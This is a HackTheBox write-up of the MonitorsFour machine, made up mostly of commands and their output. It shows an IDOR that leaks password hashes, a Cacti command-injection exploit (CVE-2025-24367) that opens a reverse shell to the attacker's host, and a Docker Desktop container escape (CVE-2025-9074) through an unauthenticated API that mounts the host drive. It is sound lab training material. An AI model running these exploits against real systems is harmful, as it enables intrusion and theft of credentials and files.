```
███╗   ███╗ ██████╗ ███╗   ██╗██╗████████╗ ██████╗ ██████╗ ███████╗███████╗ ██████╗ ██╗   ██╗██████╗ 
████╗ ████║██╔═══██╗████╗  ██║██║╚══██╔══╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██╔═══██╗██║   ██║██╔══██╗
██╔████╔██║██║   ██║██╔██╗ ██║██║   ██║   ██║   ██║██████╔╝███████╗█████╗  ██║   ██║██║   ██║██████╔╝
██║╚██╔╝██║██║   ██║██║╚██╗██║██║   ██║   ██║   ██║██╔══██╗╚════██║██╔══╝  ██║   ██║██║   ██║██╔══██╗
██║ ╚═╝ ██║╚██████╔╝██║ ╚████║██║   ██║   ╚██████╔╝██║  ██║███████║██║     ╚██████╔╝╚██████╔╝██║  ██║
╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
```

# HackTheBox - MonitorsFour Writeup

Continuing with the seasonal Gacha event on HackTheBox, I wanted to mention that MonitorsFour turned out to be quite an interesting and reasonably straightforward machine. It features IDOR, recent CVEs, and a Docker container escape to sharpen our skills and knowledge. The machine's notable characteristic is a Windows host running Docker Desktop, which adds some nuances to the privilege escalation.

## Overview

The target system hosts a corporate website for "MonitorsFour", a company positioning itself as a premium network solutions provider. The site itself is a typical corporate landing page, but the presence of authentication hints that there should be an entry point somewhere—either on the main site or on hidden subdomains.

<img width="1280" height="647" alt="image" src="https://s3.twcstorage.ru/92f5d491-kubatura/state3/2025-12-12_14-46.png" />

---

First, we add the machine's IP address to `/etc/hosts` so we can access it by domain name:

```bash
echo "10.129.12.34 monitorsfour.htb" | sudo tee -a /etc/hosts
```

---

## Reconnaissance

We start with classic reconnaissance—running a full port scan and searching for subdomains. This helps us understand what services are running on the machine and where to look for entry points. At this stage, it's important not to rush and gather as much information as possible.

```bash
nmap -sC -sV -p- 10.129.12.34 -oN nmap_full.txt
```
<img width="1280" height="647" alt="image" src="https://s3.twcstorage.ru/92f5d491-kubatura/state3/2025-12-12_14-50.png" />


**Results:**
```ini
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: MonitorsFour - Networking Solutions
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

We see only two open ports—the attack surface is small but sufficient. The `PHPSESSID` cookie indicates there's a PHP application behind Nginx, which means we should look for typical web vulnerabilities: SQL injections, LFI, IDOR, and so on. Port 5985 (WinRM) is Windows Remote Management, a service for remote Windows system administration. It will come in handy later if we find valid Windows credentials—we can use it to get a full shell via `evil-winrm`.

**Open ports:**
- **80** – Nginx (web server with PHP)
- **5985** – WinRM (Windows Remote Management)

As we've established, the main site looks like a typical landing page with no obvious vulnerabilities—static pages, a contact form, nothing interesting at first glance. In such cases, it's usually worth trying to find hidden subdomains. From experience, they often host admin panels, monitoring systems, dev environments, or internal services that aren't meant for public access and may be less protected.

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://monitorsfour.htb \
     -H "Host: FUZZ.monitorsfour.htb" -ac
```
<img width="1280" height="647" alt="image" src="https://s3.twcstorage.ru/92f5d491-kubatura/state3/2025-12-12_14-54%20(Edited).png" />

**Results:**
```yaml
cacti     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 91ms]
```

Excellent! We found the `cacti` subdomain—this is a popular open-source network monitoring system based on [RRDtool](https://oss.oetiker.ch/rrdtool/). 

[Cacti](https://www.cacti.net/) is often a target for attacks since it historically has numerous CVEs, including critical RCE vulnerabilities. Let's add it to `/etc/hosts`:

```bash
echo "10.129.12.34 cacti.monitorsfour.htb" | sudo tee -a /etc/hosts
```

---

<img width="1280" height="647" alt="image" src="https://s3.twcstorage.ru/92f5d491-kubatura/state3/2025-12-12_15-15.png" />

---

## Obtaining Credentials (IDOR)

While Cacti requires authentication, let's return to the main site and look for hidden endpoints. We'll run directory and API enumeration:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -u http://monitorsfour.htb/FUZZ -ac
```

Among the discovered endpoints is `/user`, which accepts a `token` parameter. When testing for IDOR, we typically enumerate values—`0`, 1, 2, and so on. The value 0 often either causes an error or returns all records due to improper boundary value handling. Apparently, the developers didn't implement proper validation—a request with `token=0` bypasses filtering and the server returns the complete list of users with their MD5 password hashes. A classic IDOR vulnerability:

<img width="670" height="670" alt="image" src="https://s3.twcstorage.ru/92f5d491-kubatura/state3/2025-12-12_15-10_1.png" />

```bash
curl -s "http://monitorsfour.htb/user?token=0"
```
<img width="670" height="670" alt="image" src="https://s3.twcstorage.ru/92f5d491-kubatura/state3/2025-12-12_15-18.png" />

**Server response:**
```json
[
  {
    "id": 2,
    "username": "admin",
    "email": "admin@monitorsfour.htb",
    "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
    "role": "super user",
    "token": "8024b78f83f102da4f",
    "name": "Marcus Higgins",
    "position": "System Administrator"
  },
  {
    "id": 5,
    "username": "mwatson",
    "email": "mwatson@monitorsfour.htb",
    "password": "69196959c16b26ef00b77d82cf6eb169",
    "role": "user",
    "name": "Michael Watson"
  },
  {
    "id": 6,
    "username": "janderson",
    "email": "janderson@monitorsfour.htb",
    "password": "2a22dcf99190c322d974c8df5ba3256b",
    "role": "user",
    "name": "Jennifer Anderson"
  },
  {
    "id": 7,
    "username": "dthompson",
    "email": "dthompson@monitorsfour.htb",
    "password": "8d4a7e7fd08555133e056d9aacb1e519",
    "role": "user",
    "name": "David Thompson"
  }
]
```

The obtained hashes are typically 32 characters long—this is characteristic of MD5. As we know, the MD5 algorithm is considered insecure because massive databases of precomputed hashes (rainbow tables) exist for it.

<img width="1280" height="647" alt="image" src="https://s3.twcstorage.ru/92f5d491-kubatura/state3/2025-12-12_15-20.png" />

We'll use the online service [CrackStation](https://crackstation.net/), which contains billions of precomputed hashes:

| Hash | Password |
|-----|--------|
| `56b32eb43e6f15395f6c46c1c9e1cd36` | **wonderful1** |

The other hashes weren't found in the database, but one is enough for us—and luckily, it's the administrator account (Marcus Higgins). In Cacti, he uses the login `marcus`, matching his name:

**Obtained Cacti credentials:** `marcus:wonderful1`

---

## Exploiting Cacti (CVE-2025-24367)

**CVE-2025-24367** is a vulnerability in Cacti version 1.2.28 that allows arbitrary code execution (RCE) through command injection in the Graph Template field. The vulnerability occurs due to insufficient sanitization of data passed to the rrdtool utility. A public PoC is available on GitHub: [CVE-2025-24367-Cacti-PoC](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC).

<img width="1280" height="647" alt="image" src="https://s3.twcstorage.ru/92f5d491-kubatura/state3/2025-12-12_15-22.png" />

Navigate to `http://cacti.monitorsfour.htb` and log in with the credentials:
- **Username:** marcus
- **Password:** wonderful1

At the top of the page, we notice the Cacti version and confirm: **1.2.28**

<img width="1280" height="647" alt="image" src="https://s3.twcstorage.ru/92f5d491-kubatura/state3/2025-12-12_15-23.png" />

The exploit authenticates to Cacti, creates a malicious Graph Template with command injection, and then triggers execution through rrdtool. As a result, we get a reverse shell. The exploit starts its own HTTP server on port 80 for payload delivery, so it needs to be run with `sudo`.

<img width="1280" height="647" alt="image" src="https://s3.twcstorage.ru/92f5d491-kubatura/state3/2025-12-12_15-26.png" />

Clone the repository and start a listener in a separate terminal:

```bash
git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git
cd CVE-2025-24367-Cacti-PoC
```

```bash
nc -lvnp 9001
```

Run the exploit with our parameters:

```bash
sudo python3 exploit.py -url http://cacti.monitorsfour.htb -u marcus -p wonderful1 -i 10.10.14.36 -l 9001
```

```diff
+ [+] Cacti Instance Found!
+ [+] Serving HTTP on port 80
+ [+] Login Successful!
+ [+] Got graph ID: 226
# [i] Created PHP filename: rKQT0.php
+ [+] Got payload: /bash
# [i] Created PHP filename: 4bWsW.php
+ [+] Hit timeout, looks good for shell, check your listener!
+ [+] Stopped HTTP server on port 80
```
<img width="1280" height="647" alt="image" src="https://s3.twcstorage.ru/92f5d491-kubatura/state3/2025-12-12_16-19.png" />

In the netcat terminal, we catch the shell, and the hostname `821fbd6a43fa` immediately catches our eye—a truncated container ID, typical for Docker. We didn't land on the Windows host but rather in an isolated Linux environment inside a container. Meanwhile, Nmap initially showed `Service Info: OS: Windows`—and that's not a mistake. The target machine is running Docker Desktop, which uses WSL2 as a backend. Cacti runs in a container, but the host system is Windows. This is enough for the user flag, but for root, we'll need to break out:

```text
Connection received on 10.129.12.34 57590
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
www-data@821fbd6a43fa:~/html/cacti$
```

After getting the shell, we first check our context: what user we're running as and what's available in the system. We find ourselves as `www-data`—the standard account for web services—with minimal privileges. Using `id`, we check groups—nothing interesting, just `www-data`. Next, we explore `/home` and find the `marcus` user directory. Looking at his home folder contents, we find `user.txt`. The file has 644 permissions, so it's readable without issues:

```console
www-data@821fbd6a43fa:~/html/cacti$ whoami
www-data

www-data@821fbd6a43fa:~/html/cacti$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@821fbd6a43fa:~/html/cacti$ ls -la /home
total 12
drwxr-xr-x 3 root   root   4096 Oct 15 12:34 .
drwxr-xr-x 1 root   root   4096 Oct 15 12:34 ..
drwxr-xr-x 2 marcus marcus 4096 Oct 15 12:34 marcus

www-data@821fbd6a43fa:~/html/cacti$ ls -la /home/marcus
total 12
drwxr-xr-x 2 marcus marcus 4096 Oct 15 12:34 .
drwxr-xr-x 3 root   root   4096 Oct 15 12:34 ..
-rw-r--r-- 1 marcus marcus   33 Oct 15 12:34 user.txt

www-data@821fbd6a43fa:~/html/cacti$ cat /home/marcus/user.txt
23cde88d************************
```

User flag obtained! But this isn't the end—we're inside a container, and the root flag is on the host machine.

---

## Privilege Escalation (CVE-2025-9074)

We've got a shell but we're inside a Docker container with limited privileges. To reach the root flag, we need to escape from the container to the host machine. The classic attack vector in such cases is searching for an unprotected Docker API or a mounted Docker socket.

[CVE-2025-9074](https://nvd.nist.gov/vuln/detail/CVE-2025-9074) is a vulnerability in Docker Desktop that makes the Docker Engine API accessible from containers without authentication through the internal network. Essentially, any container can create a new privileged container with the host's filesystem mounted and gain full access to the machine.

<img width="689" height="830" alt="Container enumeration and user flag" src="https://s3.twcstorage.ru/92f5d491-kubatura/state3/2025-12-12_16-26.png" />

### Finding the Docker API

First, we confirm we're in a container and explore the network environment. We need to understand what subnet we're in and what addresses are accessible from inside. We look for the gateway, DNS servers, and any other hosts we can reach:

```console
www-data@821fbd6a43fa:~/html/cacti$ hostname
821fbd6a43fa

www-data@821fbd6a43fa:~/html/cacti$ ip addr
2: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP>
    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
```

The Docker API by default listens on port 2375 (without TLS) or 2376 (with TLS), and if the API is accessible without authentication, we can create a privileged container and gain access to the host filesystem. This is the classic container escape method. We start checking from the container's gateway, usually the first address in the subnet:

```console
www-data@821fbd6a43fa:~/html/cacti$ ip route
default via 172.18.0.1 dev eth0 
172.18.0.0/16 dev eth0 proto kernel scope link src 172.18.0.2

www-data@821fbd6a43fa:~/html/cacti$ curl http://172.18.0.1:2375/version
curl: (7) Failed to connect to 172.18.0.1 port 2375 after 0 ms: Could not connect to server
```

That didn't work—the gateway is just a virtual interface for the bridge network. Let's try `host.docker.internal`—a special DNS address that Docker Desktop creates for accessing the host from containers:

```console
www-data@821fbd6a43fa:~/html/cacti$ curl -v http://host.docker.internal:2375/version
* Host host.docker.internal:2375 was resolved.
* IPv6: fdc4:f303:9324::254
* IPv4: 192.168.65.254
*   Trying 192.168.65.254:2375...
* connect to 192.168.65.254 port 2375 from 172.18.0.2 port 38548 failed: Connection refused
curl: (7) Failed to connect to host.docker.internal port 2375 after 19 ms: Could not connect to server
```

Another failure, but we got important information. The `host.docker.internal` address resolves to two addresses: IPv6 `fdc4:f303:9324::254` (unreachable, Network is unreachable) and IPv4 `192.168.65.254` (Connection refused). This is Docker Desktop's internal subnet on Windows. The 192.168.65.0/24 range is used by Docker Desktop for communication between the host and containers. The API on .254 isn't responding, but that doesn't mean it's not somewhere in this subnet.

Let's check for a Docker socket inside the container:

```console
www-data@821fbd6a43fa:~/html/cacti$ ls -la /var/run/docker.sock 2>/dev/null
www-data@821fbd6a43fa:~/html/cacti$ find / -name "docker.sock" 2>/dev/null
```

Empty again—the socket isn't mounted.

**Scanning the 192.168.65.0/24 subnet:**

Since `host.docker.internal` points to 192.168.65.254 but there's no API there, the Docker Engine might be listening on a different IP in the same subnet. We enumerate all addresses from 1 to 254—fortunately, the subnet is small and scanning will take just a couple of seconds:

```console
www-data@821fbd6a43fa:~/html/cacti$ for i in $(seq 1 254); do (curl -s --connect-timeout 1 http://192.168.65.$i:2375/version 2>/dev/null | grep -q "ApiVersion" && echo "192.168.65.$i:2375 OPEN") & done; wait
192.168.65.7:2375 OPEN
```

Finally, we get a result—the Docker API is open on 192.168.65.7.

### Exploitation

Let's verify that the API is actually responding and check the version:

```console
www-data@821fbd6a43fa:~/html/cacti$ curl http://192.168.65.7:2375/version
```

```json
{
  "Platform": {"Name": "Docker Engine - Community"},
  "Version": "28.3.2",
  "ApiVersion": "1.51",
  "KernelVersion": "6.6.87.2-microsoft-standard-WSL2",
  "Os": "linux",
  "Arch": "amd64"
}
```

The Docker API is accessible without authentication—this is **CVE-2025-9074** (CVSS 9.3), a critical vulnerability in Docker Desktop that allows containers to connect to the Docker Engine API through the internal subnet without authentication.

Next, we check available images:

```console
www-data@821fbd6a43fa:~/html/cacti$ curl -s http://192.168.65.7:2375/images/json | grep -o '"RepoTags":\[[^]]*\]'
```

```yaml
"RepoTags":["docker_setup-nginx-php:latest"]
"RepoTags":["docker_setup-mariadb:latest"]
"RepoTags":["alpine:latest"]
```

Now we need to create a container that mounts the host filesystem. On the attacking machine, we prepare a JSON configuration. The key point is the `Binds` parameter—it mounts the host's C:\ drive inside the container. The path `/mnt/host/c` is how Docker Desktop on Windows sees the host filesystem through WSL2. We use the alpine image since it's already on the machine and is minimal in size:

```bash
cat > /tmp/container.json << 'EOF'
{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
  "HostConfig": {
    "Binds": ["/mnt/host/c:/mnt/host_root"]
  },
  "Tty": true,
  "OpenStdin": true
}
EOF

cd /tmp && python3 -m http.server 8000
```

In the container, we download the payload, create, and start the container through the Docker API:

```console
www-data@821fbd6a43fa:~/html/cacti$ curl http://10.10.14.36:8000/container.json -o /tmp/container.json

www-data@821fbd6a43fa:~/html/cacti$ curl -X POST -H "Content-Type: application/json" -d @/tmp/container.json http://192.168.65.7:2375/containers/create?name=pwned
{"Id":"7d99df11ee0f9d29c093acb26f741bebda84e7d02c90097590c0791241075468","Warnings":[]}

www-data@821fbd6a43fa:~/html/cacti$ curl -X POST http://192.168.65.7:2375/containers/7d99df11ee0f/start

www-data@821fbd6a43fa:~/html/cacti$ curl http://192.168.65.7:2375/containers/7d99df11ee0f/logs?stdout=true
bdb6416e************************
```

<img width="602" height="790" alt="Docker API exploitation - root flag" src="https://s3.twcstorage.ru/92f5d491-kubatura/state3/2025-12-12_16-57.png" />

---

That's it—root flag obtained! This machine teaches important lessons: don't stop at the first shell, explore the container's network environment, and know the specifics of Docker Desktop on Windows. It's also a good reminder of why MD5 is a poor choice for password hashing and why APIs should verify access rights. I hope this writeup was helpful to you. Thanks to everyone who read to the end, and good luck with your continued learning or practice in cybersecurity!

That's it! See you next time :)
